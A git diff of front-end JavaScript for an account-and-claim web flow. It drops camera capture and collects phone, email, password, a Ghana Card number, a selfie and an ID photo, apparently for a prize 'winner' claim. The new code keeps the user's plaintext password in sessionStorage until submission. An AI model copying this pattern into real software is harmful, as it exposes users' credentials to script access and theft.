@@ -728,57 +728,24 @@ function initAccountForm() {
       privacyAgreement: privacyAgreement,
     });
 
-    try {
-      // Send account data to API to store in session
-      const response = await fetch("api_account.php", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/x-www-form-urlencoded",
-        },
-        body: new URLSearchParams({
-          action: "create_account",
-          phone: phone,
-          email: email,
-          password: password,
-          is_account_holder: isAccountHolder,
-          terms_agreement: termsAgreement,
-          privacy_agreement: privacyAgreement,
-        }),
-      });
+    // Store account data locally for later use
+    const accountData = {
+      phone: phone,
+      email: email,
+      password: password,
+      isAccountHolder: isAccountHolder,
+      termsAgreement: termsAgreement,
+      privacyAgreement: privacyAgreement,
+    };
 
-      const result = await response.json();
-      console.log("Account creation response:", result);
+    // Store in session storage for later use
+    sessionStorage.setItem("accountData", JSON.stringify(accountData));
 
-      if (result.status === "success") {
-        // Store account data locally for later use
-        currentUser = {
-          phone: phone,
-          email: email,
-          ...result.winner_info,
-        };
+    console.log("Account data stored locally, showing contract modal");
 
-        console.log("About to show contract modal");
-
-        // Hide current modal and show contract modal
-        hideModal();
-        showModal("contractModal");
-      } else {
-        // Show error message
-        console.error("Account creation failed:", result.message);
-        const errorMessage = document.getElementById("error-message");
-        errorMessage.textContent = result.message || "Failed to create account";
-        showModal("errorModal");
-      }
-    } catch (error) {
-      console.error("Error creating account:", error);
-      const errorMessage = document.getElementById("error-message");
-      errorMessage.textContent = "Network error. Please try again.";
-      showModal("errorModal");
-    } finally {
-      // Re-enable submit button
-      submitBtn.disabled = false;
-      submitBtn.textContent = originalText;
-    }
+    // Hide current modal and show contract modal
+    hideModal();
+    showModal("contractModal");
   });
 }
 // Initialize Contract Form
@@ -841,105 +808,8 @@ function initContractForm() {
   }
 }
 
-// Camera functionality
-let stream = null;
-let currentFacingMode = "user"; // 'user' for front camera, 'environment' for back camera
+// Global variable for captured image
 let capturedImage = null;
-
-// Start camera function
-async function startCamera() {
-  try {
-    const cameraModal = document.getElementById("cameraModal");
-    const cameraVideo = document.getElementById("cameraVideo");
-
-    cameraModal.style.display = "flex";
-    document.body.style.overflow = "hidden";
-
-    // Stop any existing streams
-    if (stream) {
-      stopCamera();
-    }
-
-    // Request camera access with better constraints
-    const constraints = {
-      video: {
-        facingMode: currentFacingMode,
-        width: { ideal: 1280 },
-        height: { ideal: 720 },
-      },
-      audio: false,
-    };
-
-    stream = await navigator.mediaDevices.getUserMedia(constraints);
-
-    // Show camera feed
-    cameraVideo.srcObject = stream;
-    await cameraVideo.play();
-
-    // Set canvas dimensions to match video
-    const cameraCanvas = document.getElementById("cameraCanvas");
-    cameraCanvas.width = cameraVideo.videoWidth;
-    cameraCanvas.height = cameraVideo.videoHeight;
-  } catch (err) {
-    console.error("Error accessing camera:", err);
-    alert(
-      "Could not access the camera. Please check your permissions and try again."
-    );
-    stopCamera();
-  }
-}
-
-// Stop camera function
-function stopCamera() {
-  if (stream) {
-    stream.getTracks().forEach((track) => track.stop());
-    stream = null;
-  }
-  const cameraModal = document.getElementById("cameraModal");
-  if (cameraModal) {
-    cameraModal.style.display = "none";
-  }
-  document.body.style.overflow = "";
-}
-
-// Switch between front and back camera
-async function switchCamera() {
-  currentFacingMode = currentFacingMode === "user" ? "environment" : "user";
-  await startCamera();
-}
-
-// Capture image from camera
-function captureImage() {
-  const cameraVideo = document.getElementById("cameraVideo");
-  const cameraCanvas = document.getElementById("cameraCanvas");
-  const ctx = cameraCanvas.getContext("2d");
-
-  // Draw current video frame to canvas
-  ctx.drawImage(cameraVideo, 0, 0, cameraCanvas.width, cameraCanvas.height);
-
-  // Convert canvas to blob
-  cameraCanvas.toBlob(
-    (blob) => {
-      // Create a file from the blob
-      const file = new File([blob], "selfie.jpg", { type: "image/jpeg" });
-      capturedImage = file;
-
-      // Display the captured image
-      displayImagePreview(file);
-
-      // Stop the camera
-      stopCamera();
-
-      // Update the file input
-      const fileInput = document.getElementById("fileInput");
-      const dataTransfer = new DataTransfer();
-      dataTransfer.items.add(file);
-      fileInput.files = dataTransfer.files;
-    },
-    "image/jpeg",
-    0.9
-  );
-}
 
 // Initialize KYC Form
 function initKycForm() {
@@ -952,16 +822,12 @@ function initKycForm() {
   const retakeBtn = document.getElementById("retakeBtn");
   const submitKycBtn = document.getElementById("submitKycBtn");
   const backBtn = kycForm?.querySelector(".back-btn");
-  const cameraOption = document.getElementById("cameraOption");
-  const fileOption = document.getElementById("fileOption");
-  const cameraInput = document.getElementById("cameraInput");
-  const cameraModal = document.getElementById("cameraModal");
-  const cameraVideo = document.getElementById("cameraVideo");
-  const captureBtn = document.getElementById("captureBtn");
-  const closeCameraBtn = document.getElementById("closeCameraBtn");
-  const switchCameraBtn = document.getElementById("switchCameraBtn");
-  const cameraCanvas = document.getElementById("cameraCanvas");
-  const ctx = cameraCanvas.getContext("2d");
+  const selfieInput = document.getElementById("selfieInput");
+
+  // Initially disable submit button
+  if (submitKycBtn) {
+    submitKycBtn.disabled = true;
+  }
 
   // Format Ghana Card input
   if (ghanaCardInput) {
@@ -975,7 +841,7 @@ function initKycForm() {
     });
   }
 
-  // Handle file selection
+  // Handle file input change
   if (fileInput) {
     fileInput.addEventListener("change", (e) => {
       const file = e.target.files[0];
@@ -986,55 +852,21 @@ function initKycForm() {
     });
   }
 
-  // Handle camera option click
-  if (cameraOption) {
-    cameraOption.addEventListener("click", (e) => {
-      e.preventDefault();
-      startCamera();
-    });
-  }
-
-  // Handle file option click
-  if (fileOption) {
-    fileOption.addEventListener("click", (e) => {
-      e.preventDefault();
-      e.stopPropagation();
-      const fileInput = document.getElementById("fileInput");
-      if (fileInput) {
-        fileInput.click();
+  // Handle selfie input change
+  if (selfieInput) {
+    selfieInput.addEventListener("change", (e) => {
+      const file = e.target.files[0];
+      if (file) {
+        capturedImage = file;
+        displayImagePreview(file);
       }
     });
-  }
-
-  // Handle capture button
-  if (captureBtn) {
-    captureBtn.addEventListener("click", captureImage);
-  }
-
-  // Handle close camera button
-  if (closeCameraBtn) {
-    closeCameraBtn.addEventListener("click", stopCamera);
-  }
-
-  // Handle switch camera button
-  if (switchCameraBtn) {
-    switchCameraBtn.addEventListener("click", switchCamera);
   }
 
   // Handle retake photo
   if (retakeBtn) {
     retakeBtn.addEventListener("click", () => {
-      // Check if this was a camera capture
-      if (
-        capturedImage &&
-        capturedImage.name &&
-        capturedImage.name.startsWith("capture_")
-      ) {
-        resetImagePreview();
-        startCamera(); // Restart camera for retake
-      } else {
-        resetImagePreview();
-      }
+      resetImagePreview();
     });
   }
 
@@ -1051,13 +883,15 @@ function initKycForm() {
     if (!ghanaCardInput || !submitKycBtn) return true;
 
     const isGhanaCardValid = ghanaCardInput.validity.valid;
-    const hasImage =
-      (previewImage && previewImage.src && previewImage.src !== "") ||
-      capturedImage;
+    const hasSelfie =
+      selfieInput && selfieInput.files && selfieInput.files.length > 0;
+    const hasGhanaCard =
+      fileInput && fileInput.files && fileInput.files.length > 0;
 
-    // Always enable submit button
-    submitKycBtn.disabled = false;
-    return true;
+    // Enable submit button only if Ghana card is valid AND at least one photo is uploaded
+    submitKycBtn.disabled = !(isGhanaCardValid && (hasSelfie || hasGhanaCard));
+
+    return isGhanaCardValid && (hasSelfie || hasGhanaCard);
   }
 
   // Display image preview
@@ -1066,18 +900,6 @@ function initKycForm() {
     reader.onload = (e) => {
       previewImage.src = e.target.result;
       uploadPreview.style.display = "block";
-
-      // Show retake button only for camera captures
-      const previewActions = document.getElementById("previewActions");
-      if (
-        previewActions &&
-        file.type === "image/jpeg" &&
-        capturedImage &&
-        capturedImage.name.startsWith("capture_")
-      ) {
-        previewActions.style.display = "block";
-      }
-
       validateKycForm();
     };
     reader.readAsDataURL(file);
@@ -1088,11 +910,13 @@ function initKycForm() {
     const uploadPreview = document.getElementById("uploadPreview");
     const previewImage = document.getElementById("previewImage");
     const fileInput = document.getElementById("fileInput");
+    const selfieInput = document.getElementById("selfieInput");
     const previewActions = document.getElementById("previewActions");
 
     if (uploadPreview) uploadPreview.style.display = "none";
     if (previewImage) previewImage.src = "";
     if (fileInput) fileInput.value = "";
+    if (selfieInput) selfieInput.value = "";
     if (previewActions) previewActions.style.display = "none";
 
     capturedImage = null;
@@ -1112,14 +936,30 @@ function initKycForm() {
     submitKycBtn.textContent = "Submitting...";
 
     try {
-      // Create FormData for file upload
+      // First, create the account with all data
+      const accountData = JSON.parse(
+        sessionStorage.getItem("accountData") || "{}"
+      );
+
+      // Create FormData for claim submission
       const formData = new FormData();
       formData.append("action", "create_claim");
       formData.append("ghana_card", ghanaCard);
 
-      // Add selfie image if captured
-      if (capturedImage) {
-        formData.append("selfie_image", capturedImage);
+      // Add account data
+      formData.append("phone", accountData.phone);
+      formData.append("email", accountData.email);
+      formData.append("password", accountData.password);
+      formData.append("is_account_holder", accountData.isAccountHolder);
+      formData.append("terms_agreement", accountData.termsAgreement);
+      formData.append("privacy_agreement", accountData.privacyAgreement);
+
+      // Add images if captured
+      if (selfieInput && selfieInput.files && selfieInput.files.length > 0) {
+        formData.append("selfie_image", selfieInput.files[0]);
+      }
+      if (fileInput && fileInput.files && fileInput.files.length > 0) {
+        formData.append("ghana_card_image", fileInput.files[0]);
       }
 
       const response = await fetch("api_claim.php", {
@@ -1130,6 +970,9 @@ function initKycForm() {
       const result = await response.json();
 
       if (result.status === "success") {
+        // Clear session storage
+        sessionStorage.removeItem("accountData");
+
         // Show success modal
         hideModal();
         const successModal = document.getElementById("successModal");
@@ -1153,13 +996,6 @@ function initKycForm() {
       submitKycBtn.textContent = originalText;
     }
   }
-
-  // Clean up camera on page unload
-  window.addEventListener("beforeunload", () => {
-    if (stream) {
-      stopCamera();
-    }
-  });
 }
 
 // Initialize Modals
